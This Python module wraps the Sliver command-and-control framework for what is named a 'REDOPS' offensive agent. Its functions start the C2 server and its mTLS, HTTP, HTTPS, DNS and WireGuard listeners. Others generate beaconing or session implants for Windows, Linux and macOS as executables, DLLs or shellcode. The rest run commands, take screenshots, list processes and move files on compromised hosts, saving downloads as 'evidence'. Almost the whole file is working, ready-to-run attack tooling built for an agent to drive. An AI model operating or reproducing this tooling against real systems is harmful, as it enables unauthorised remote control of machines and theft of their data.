"""Sliver C2 management module for REDOPS agent.

Provides a synchronous wrapper around sliver-py's async API for:
- Server daemon management (start/stop)
- Listener management (mTLS, HTTP, HTTPS, DNS, WireGuard)
- Implant generation (session & beacon modes)
- Session/beacon interaction (execute, upload, download, screenshot, etc.)
"""

import asyncio
import json
import os
import signal
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path

import sliver
from sliver import SliverClient, SliverClientConfig

SLIVER_SERVER_BIN = os.getenv(
    "SLIVER_SERVER_BIN",
    str(Path.home() / ".local" / "bin" / "sliver-server"),
)
SLIVER_CONFIG_DIR = Path.home() / ".sliver-client" / "configs"
DEFAULT_CONFIG = SLIVER_CONFIG_DIR / "redops.cfg"
IMPLANT_OUTPUT_DIR = Path("/home/kali/OffensiveAI/redops/data/implants")
IMPLANT_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


_loop = None

def _get_loop():
    """Get or create a persistent event loop for async operations."""
    global _loop
    if _loop is None or _loop.is_closed():
        _loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_loop)
    return _loop

def _run_async(coro):
    """Run an async coroutine synchronously using a persistent event loop."""
    loop = _get_loop()
    return loop.run_until_complete(coro)


@dataclass
class SliverDaemon:
    """Manages the Sliver server daemon process."""

    pid: int | None = None
    _process: subprocess.Popen | None = field(default=None, repr=False)

    def start(self, lhost: str = "0.0.0.0", lport: int = 31337) -> str:
        """Start the Sliver server daemon."""
        if self.is_running():
            return f"Sliver daemon already running (PID {self.pid})"

        cmd = [
            SLIVER_SERVER_BIN, "daemon",
            "--lhost", lhost,
            "--lport", str(lport),
        ]
        self._process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self.pid = self._process.pid

        # Wait briefly for it to initialize
        time.sleep(3)

        if self._process.poll() is not None:
            stderr = self._process.stderr.read().decode() if self._process.stderr else ""
            return f"Sliver daemon failed to start: {stderr}"

        return f"Sliver daemon started (PID {self.pid}) on {lhost}:{lport}"

    def stop(self) -> str:
        """Stop the Sliver server daemon."""
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()
            self.pid = None
            return "Sliver daemon stopped."
        # Try to find and kill any running sliver-server daemon
        result = subprocess.run(
            ["pkill", "-f", "sliver-server daemon"],
            capture_output=True,
        )
        self.pid = None
        return "Sliver daemon stop signal sent."

    def is_running(self) -> bool:
        """Check if daemon is running."""
        if self._process and self._process.poll() is None:
            return True
        # Check for any sliver-server daemon process
        result = subprocess.run(
            ["pgrep", "-f", "sliver-server daemon"],
            capture_output=True, text=True,
        )
        if result.stdout.strip():
            self.pid = int(result.stdout.strip().splitlines()[0])
            return True
        return False


class SliverManager:
    """High-level Sliver C2 management interface for the REDOPS agent."""

    def __init__(self, config_path: str | Path = DEFAULT_CONFIG):
        self.config_path = Path(config_path)
        self.daemon = SliverDaemon()
        self._client: SliverClient | None = None

    # --- Connection ---

    async def _connect(self) -> SliverClient:
        """Connect to the Sliver server."""
        config = SliverClientConfig.parse_config_file(str(self.config_path))
        client = SliverClient(config)
        await client.connect()
        return client

    def connect(self) -> str:
        """Connect to the Sliver server synchronously."""
        try:
            self._client = _run_async(self._connect())
            version = _run_async(self._client.version())
            return f"Connected to Sliver server v{version.Major}.{version.Minor}.{version.Patch}"
        except Exception as e:
            return f"Connection failed: {e}"

    @property
    def is_connected(self) -> bool:
        return self._client is not None

    def _ensure_connected(self) -> str | None:
        """Ensure we're connected, return error string if not."""
        if not self._client:
            result = self.connect()
            if "failed" in result.lower():
                return result
        return None

    # --- Server Management ---

    def start_server(self, lhost: str = "0.0.0.0", lport: int = 31337) -> str:
        """Start Sliver daemon and connect."""
        msg = self.daemon.start(lhost, lport)
        if "failed" in msg.lower():
            return msg
        # Connect after starting
        conn_msg = self.connect()
        return f"{msg}\n{conn_msg}"

    def stop_server(self) -> str:
        """Stop the Sliver daemon."""
        self._client = None
        return self.daemon.stop()

    def server_status(self) -> str:
        """Get server status."""
        running = self.daemon.is_running()
        status = f"Daemon: {'running' if running else 'stopped'}"
        if running:
            status += f" (PID {self.daemon.pid})"
        status += f"\nClient: {'connected' if self.is_connected else 'disconnected'}"
        return status

    # --- Listeners ---

    def start_listener(
        self,
        protocol: str = "mtls",
        lhost: str = "0.0.0.0",
        lport: int = 8443,
        domain: str = "",
    ) -> str:
        """Start a C2 listener."""
        err = self._ensure_connected()
        if err:
            return err

        try:
            protocol = protocol.lower()
            if protocol == "mtls":
                job = _run_async(self._client.start_mtls_listener(lhost, lport))
            elif protocol == "http":
                job = _run_async(self._client.start_http_listener(domain or lhost, lport))
            elif protocol == "https":
                job = _run_async(self._client.start_https_listener(domain or lhost, lport))
            elif protocol == "dns":
                if not domain:
                    return "DNS listener requires a domain (e.g., c2.example.com)"
                job = _run_async(self._client.start_dns_listener(domain, lhost, lport))
            elif protocol == "wg":
                job = _run_async(self._client.start_wg_listener(lhost, lport, 0, 0))
            else:
                return f"Unknown protocol: {protocol}. Use: mtls, http, https, dns, wg"

            return f"{protocol.upper()} listener started on {lhost}:{lport} (Job ID: {job.ID})"
        except Exception as e:
            err = str(e)
            if "ALREADY_EXISTS" in err or "in use" in err:
                return f"Port {lport} is already in use. Choose a different port."
            return f"Failed to start listener: {err}"

    def list_jobs(self) -> str:
        """List active listeners/jobs."""
        err = self._ensure_connected()
        if err:
            return err

        try:
            jobs = _run_async(self._client.jobs())
            if not jobs:
                return "No active jobs/listeners."

            lines = ["Active listeners:"]
            for job in jobs:
                desc = getattr(job, "Description", "")
                lines.append(
                    f"  [{job.ID}] {job.Name} — {desc} (port: {job.Port}, proto: {job.Protocol})"
                )
            return "\n".join(lines)
        except Exception as e:
            return f"Error listing jobs: {e}"

    def kill_job(self, job_id: int) -> str:
        """Kill a listener/job by ID."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            _run_async(self._client.kill_job(job_id))
            return f"Job {job_id} killed."
        except Exception as e:
            return f"Error killing job: {e}"

    # --- Implant Generation ---

    def generate_implant(
        self,
        listener_url: str,
        os_target: str = "windows",
        arch: str = "amd64",
        implant_type: str = "beacon",
        format: str = "exe",
        name: str = "",
        interval: int = 60,
        jitter: int = 30,
    ) -> str:
        """Generate a Sliver implant.

        Args:
            listener_url: C2 callback URL (e.g., mtls://10.10.10.1:8443)
            os_target: Target OS (windows, linux, darwin)
            arch: Architecture (amd64, 386, arm64)
            implant_type: 'session' for interactive, 'beacon' for async
            format: Output format (exe, shared, shellcode, service)
            name: Implant name (auto-generated if empty)
            interval: Beacon callback interval in seconds
            jitter: Beacon jitter percentage
        """
        err = self._ensure_connected()
        if err:
            return err

        try:
            # Parse the listener URL
            proto, _, hostport = listener_url.partition("://")
            if not hostport:
                return "Invalid listener URL. Format: protocol://host:port (e.g., mtls://10.10.10.1:8443)"

            host, _, port_str = hostport.rpartition(":")
            port = int(port_str) if port_str else 8443

            # Build implant config
            if implant_type == "beacon":
                config = sliver.client_pb2.ImplantConfig(
                    IsBeacon=True,
                    BeaconInterval=interval * 10**9,  # nanoseconds
                    BeaconJitter=jitter * 10**9,
                    GOOS=os_target,
                    GOARCH=arch,
                    Format=self._format_enum(format),
                    C2=[sliver.client_pb2.ImplantC2(
                        URL=listener_url,
                        Priority=0,
                    )],
                )
                if name:
                    config.Name = name
            else:
                config = sliver.client_pb2.ImplantConfig(
                    IsBeacon=False,
                    GOOS=os_target,
                    GOARCH=arch,
                    Format=self._format_enum(format),
                    C2=[sliver.client_pb2.ImplantC2(
                        URL=listener_url,
                        Priority=0,
                    )],
                )
                if name:
                    config.Name = name

            result = _run_async(self._client.generate_implant(config))

            # Save the implant
            implant_name = result.File.Name or name or f"implant_{int(time.time())}"
            ext = {"exe": ".exe", "shared": ".dll", "shellcode": ".bin", "service": ".exe"}.get(format, "")
            out_path = IMPLANT_OUTPUT_DIR / f"{implant_name}{ext}"
            out_path.write_bytes(result.File.Data)

            return (
                f"Implant generated successfully:\n"
                f"  Name: {implant_name}\n"
                f"  Type: {implant_type} ({os_target}/{arch})\n"
                f"  Format: {format}\n"
                f"  C2: {listener_url}\n"
                f"  Saved: {out_path}\n"
                f"  Size: {len(result.File.Data) / 1024:.1f} KB"
            )
        except Exception as e:
            return f"Failed to generate implant: {e}"

    @staticmethod
    def _format_enum(fmt: str) -> int:
        """Convert format string to protobuf enum."""
        return {
            "exe": 2,        # OutputFormat.EXECUTABLE
            "shared": 1,     # OutputFormat.SHARED_LIB
            "shellcode": 3,  # OutputFormat.SHELLCODE
            "service": 4,    # OutputFormat.SERVICE
        }.get(fmt.lower(), 2)

    def list_implant_builds(self) -> str:
        """List all generated implant builds."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            builds = _run_async(self._client.implant_builds())
            if not builds:
                return "No implant builds found."
            lines = ["Implant builds:"]
            for name, cfg in builds.items():
                mode = "beacon" if cfg.IsBeacon else "session"
                lines.append(f"  {name} — {cfg.GOOS}/{cfg.GOARCH} ({mode})")
            return "\n".join(lines)
        except Exception as e:
            return f"Error listing builds: {e}"

    # --- Sessions & Beacons ---

    def list_sessions(self) -> str:
        """List active sessions."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            sessions = _run_async(self._client.sessions())
            if not sessions:
                return "No active sessions."
            lines = ["Active sessions:"]
            for s in sessions:
                lines.append(
                    f"  [{s.ID[:8]}] {s.Name} — {s.RemoteAddress} "
                    f"({s.OS}/{s.Arch}) user={s.Username} host={s.Hostname}"
                )
            return "\n".join(lines)
        except Exception as e:
            return f"Error listing sessions: {e}"

    def list_beacons(self) -> str:
        """List active beacons."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            beacons = _run_async(self._client.beacons())
            if not beacons:
                return "No active beacons."
            lines = ["Active beacons:"]
            for b in beacons:
                lines.append(
                    f"  [{b.ID[:8]}] {b.Name} — {b.RemoteAddress} "
                    f"({b.OS}/{b.Arch}) user={b.Username} host={b.Hostname}"
                )
            return "\n".join(lines)
        except Exception as e:
            return f"Error listing beacons: {e}"

    def interact_session(self, session_id: str, command: str) -> str:
        """Execute a command on a session."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            session = _run_async(self._client.interact_session(session_id))
            result = _run_async(session.execute(command, []))
            stdout = result.Stdout.decode() if result.Stdout else ""
            stderr = result.Stderr.decode() if result.Stderr else ""
            output = stdout
            if stderr:
                output += f"\n[STDERR] {stderr}"
            return output or "(no output)"
        except Exception as e:
            return f"Error: {e}"

    def interact_beacon(self, beacon_id: str, command: str) -> str:
        """Queue a command on a beacon (async — result comes on next check-in)."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            beacon = _run_async(self._client.interact_beacon(beacon_id))
            task = _run_async(beacon.execute(command, []))
            return f"Task queued (ID: {task.TaskID[:8]}). Result available on next beacon check-in."
        except Exception as e:
            return f"Error: {e}"

    def session_screenshot(self, session_id: str) -> str:
        """Take a screenshot from a session."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            session = _run_async(self._client.interact_session(session_id))
            result = _run_async(session.screenshot())
            out_path = Path("/home/kali/OffensiveAI/evidence") / f"screenshot_{session_id[:8]}_{int(time.time())}.png"
            out_path.write_bytes(result.Data)
            return f"Screenshot saved: {out_path} ({len(result.Data) / 1024:.1f} KB)"
        except Exception as e:
            return f"Error: {e}"

    def session_ps(self, session_id: str) -> str:
        """List processes on a session."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            session = _run_async(self._client.interact_session(session_id))
            result = _run_async(session.ps())
            lines = [f"{'PID':>7} {'PPID':>7} {'User':<20} {'Name'}"]
            for p in result.Processes[:50]:
                lines.append(f"{p.Pid:>7} {p.Ppid:>7} {p.Owner:<20} {p.Executable}")
            if len(result.Processes) > 50:
                lines.append(f"... and {len(result.Processes) - 50} more")
            return "\n".join(lines)
        except Exception as e:
            return f"Error: {e}"

    def session_upload(self, session_id: str, local_path: str, remote_path: str) -> str:
        """Upload a file to a session."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            data = Path(local_path).read_bytes()
            session = _run_async(self._client.interact_session(session_id))
            _run_async(session.upload(remote_path, data))
            return f"Uploaded {local_path} -> {remote_path} ({len(data) / 1024:.1f} KB)"
        except Exception as e:
            return f"Error: {e}"

    def session_download(self, session_id: str, remote_path: str) -> str:
        """Download a file from a session."""
        err = self._ensure_connected()
        if err:
            return err
        try:
            session = _run_async(self._client.interact_session(session_id))
            result = _run_async(session.download(remote_path))
            filename = Path(remote_path).name
            out_path = Path("/home/kali/OffensiveAI/evidence") / filename
            out_path.write_bytes(result.Data)
            return f"Downloaded {remote_path} -> {out_path} ({len(result.Data) / 1024:.1f} KB)"
        except Exception as e:
            return f"Error: {e}"

    # --- Convenience ---

    def full_status(self) -> str:
        """Get complete C2 status: server, listeners, sessions, beacons."""
        parts = [self.server_status()]
        if self.daemon.is_running():
            if not self.is_connected:
                self.connect()
            if self.is_connected:
                parts.append(self.list_jobs())
                parts.append(self.list_sessions())
                parts.append(self.list_beacons())
        return "\n\n".join(parts)
